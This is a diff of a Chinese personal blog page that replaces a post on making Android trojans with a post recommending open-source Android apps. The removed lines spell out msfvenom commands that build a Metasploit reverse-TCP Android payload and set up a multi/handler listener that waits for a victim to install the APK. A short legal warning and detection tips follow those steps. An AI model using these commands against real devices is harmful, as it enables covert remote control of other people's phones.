@@ -22,7 +22,7 @@
 
   
 
-  <title>安卓木马 | 枫叶个人博客</title>
+  <title>安卓好用的开源app分享 | 枫叶个人博客</title>
 
   
 
@@ -51,7 +51,7 @@
 <!-- header container -->
 <header class="header-container post">
   
-    <div class="post-image" style="background-image: url(https://onw.cc/1drv.ms.php?url=https://1drv.ms/i/s!Avg2PZWL9IIh8QQhtpdELCA1xw1_?e=ygSvQQ)"></div>
+    <div class="post-image" style="background-image: url(https://onw.cc/1drv.ms.php?url=https://1drv.ms/i/s!Avg2PZWL9IIh8FVQuDEyDLLANkqR?e=cN1QRq)"></div>
   
 
   <!-- navbar -->
@@ -102,17 +102,12 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">安卓木马</h1>
+          <h1 class="title-wrap">安卓好用的开源app分享</h1>
           <h2 class="title-sub-wrap">
             <strong>John Doe</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2024-02-11T07:49:13.000Z" itemprop="datePublished">2024-02-11</time>
+            <time  class="article-date" datetime="2024-04-15T01:34:22.000Z" itemprop="datePublished">2024-04-15</time>
           </h2>
-          
-            <h2 class="last-time">
-              <span>最后更新于</span>
-              <time  class="article-updated" datetime="2024-02-21T17:28:35.665Z" itemprop="dateUpdated">2024-02-22</time>
-            </h2>
           
           
           <ul class="wrap-list dark">
@@ -120,7 +115,7 @@
 </ul>
           <ul class="wrap-list dark">
   
-    <li><a href="/tags/kali%E6%95%99%E5%AD%A6/">🏷️ kali教学</a></li>
+    <li><a href="/tags/%E6%8E%A8%E8%8D%90/">🏷️ 推荐</a></li>
   
 </ul>
         </div>
@@ -144,20 +139,15 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h2 id="大家好本期分享安卓木马的制作方法和原理以及如何检测和清除木马"><a href="#大家好本期分享安卓木马的制作方法和原理以及如何检测和清除木马" class="headerlink" title="大家好本期分享安卓木马的制作方法和原理以及如何检测和清除木马"></a>大家好本期分享安卓木马的制作方法和原理以及如何检测和清除木马</h2><p>本期我们使用的工具是kali的metasploit<br>那么metasploit是什么呢？<br>metasploit是一个基于python的工具，用于渗透测试和渗透测试中的工具。<br>metasploit可以制作手机电脑的木马，本期只会教程本地的安卓木马</p>
-<h2 id="首先我们查看自己的kali的ip地址"><a href="#首先我们查看自己的kali的ip地址" class="headerlink" title="首先我们查看自己的kali的ip地址"></a>首先我们查看自己的kali的ip地址</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
-<h2 id="然后我们使用msfvenom来制作安卓木马"><a href="#然后我们使用msfvenom来制作安卓木马" class="headerlink" title="然后我们使用msfvenom来制作安卓木马"></a>然后我们使用msfvenom来制作安卓木马</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=你kali的ip LPORT=端口 R &gt; /root/应用名称.apk</span><br></pre></td></tr></table></figure>
-<p>这个命令会在&#x2F;root目录下生成一个名为应用名称.apk的文件，这个文件就是我们的木马程序</p>
-<h2 id="我们输入"><a href="#我们输入" class="headerlink" title="我们输入"></a>我们输入</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<h2 id="然后输入"><a href="#然后输入" class="headerlink" title="然后输入"></a>然后输入</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
-<p>加载模块</p>
-<h2 id="然后我们输入"><a href="#然后我们输入" class="headerlink" title="然后我们输入"></a>然后我们输入</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
-<p>我们查看参数</p>
-<h2 id="然后输入-1"><a href="#然后输入-1" class="headerlink" title="然后输入"></a>然后输入</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set LHOST 你的kali的ip</span><br></pre></td></tr></table></figure>
-<h2 id="接着输入"><a href="#接着输入" class="headerlink" title="接着输入"></a>接着输入</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set LPORT 端口</span><br></pre></td></tr></table></figure>
-<h2 id="然后输入-2"><a href="#然后输入-2" class="headerlink" title="然后输入"></a>然后输入</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<h2 id="然后我们等着目标安装app程序并打开我们便可以操作了"><a href="#然后我们等着目标安装app程序并打开我们便可以操作了" class="headerlink" title="然后我们等着目标安装app程序并打开我们便可以操作了"></a>然后我们等着目标安装app程序并打开我们便可以操作了</h2><p>在此声明，木马程序是违法的，根据我国《刑法》的规定，制造、传播或者提供专门用于侵入、非法控制计算机信息系统的程序、工具，情节严重的，构成犯罪，将受到相应的法律处罚<br>所以本期没有图片，如果有问题可以联系我</p>
-<h2 id="如何检测和清除木马"><a href="#如何检测和清除木马" class="headerlink" title="如何检测和清除木马"></a>如何检测和清除木马</h2><p>首先木马病毒是一个远程控制的软件，在黑客端输入命令即可控制app进行操作，所以预防的第一个方法就是观察手机有无明显掉电验证，如果有则是木马病毒。<br>其次我们可以多注意手机上的信号灯变化，我使用的小米手机，当摄像头或者一些东西运行时状态栏会有对应的图标，如果出现类似图标则有可能是木马病毒。<br>其次就是观察手机上app的图标，如果是一个安卓图标，那么有可能是木马病毒，其次就是发现后我们应该如何删除<br>首先我们打开手机的设置，然后进入应用管理，然后选择应用，进去删除，因为木马病毒是可以隐藏app图标的，所以我们需要到应用管理中删除，找到可疑的app，然后删除即可。<br>以上就是本期分享的内容，希望对大家有所帮助。</p>
+        <h1 id="安卓手机上的小内存，多功能，开源的app推荐"><a href="#安卓手机上的小内存，多功能，开源的app推荐" class="headerlink" title="安卓手机上的小内存，多功能，开源的app推荐"></a>安卓手机上的小内存，多功能，开源的app推荐</h1><h3 id="aves"><a href="#aves" class="headerlink" title="aves"></a><a target="_blank" rel="noopener" href="https://github.com/deckerst/aves">aves</a></h3><blockquote>
+<p>这个软件我愿意称为安卓上最好的相册查看软件【个人观点】，比起其他收费的一些软件，这个软件的功能和体验都比其他软件要好很多，而且开源，可以自由修改，<br>同时他还支持360°的全景模式，搭配谷歌相机轻松实现身临其境的感觉，他的预览可以陀螺仪的方式预览也是很方便，还支持地图定位，方便查看照片在哪里拍摄的,<br>内存大小为33.7mb</p>
+</blockquote>
+<h3 id="pilipala"><a href="#pilipala" class="headerlink" title="pilipala"></a><a target="_blank" rel="noopener" href="https://github.com/guozhigq/pilipala">pilipala</a></h3><blockquote>
+<p>该软件是使用Flutter开发的BiliBili第三方客户端<br>推荐这个app原因也很简单首先就是没有任何广告，而且界面简洁，也是实现了b站的许多功能，接口也是b站的原始接口，由<a target="_blank" rel="noopener" href="https://github.com/SocialSisterYi/bilibili-API-collect">bilibili-API-collect</a>项目提供接口<br>内存大小为17mb</p>
+</blockquote>
+<h3 id="miru-app"><a href="#miru-app" class="headerlink" title="miru-app"></a><a target="_blank" rel="noopener" href="https://github.com/miru-project/miru-app">miru-app</a></h3><blockquote>
+<p>免费，开源的 支持视频，漫画，小说扩展源的多功能应用，支持 Android，Windows，Web<br>推荐原因支持在线观看多种视频，漫画，小说源，实现多平台的统一系统 UI 的设计语言，同时支持BT 种子播放<br>内存大小为49.6mb</p>
+</blockquote>
 
       </section>
 
@@ -165,32 +155,14 @@
       
         <nav class="article-nav">
           
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-      <div class="card-cover" background-image-lazy data-img="https://onw.cc/1drv.ms.php?url=https://1drv.ms/i/s!Avg2PZWL9IIh8QQhtpdELCA1xw1_?e=ygSvQQ"></div>
-    
-    <div class="card-text">
-      
-        <a href="/2024/02/21/ddos/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">ddos</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
-      <div class="card-cover" background-image-lazy data-img="https://onw.cc/1drv.ms.php?url=https://1drv.ms/i/s!Avg2PZWL9IIh8QQhtpdELCA1xw1_?e=ygSvQQ"></div>
-    
     <div class="card-text">
       
-        <a href="/2024/02/09/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">SQL注入攻击原理</h2>
+        <a href="/2024/03/28/%E9%80%9A%E7%9F%A5/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">通知</h2>
         </a>
       
       <div class="card-text--row">Older</div>
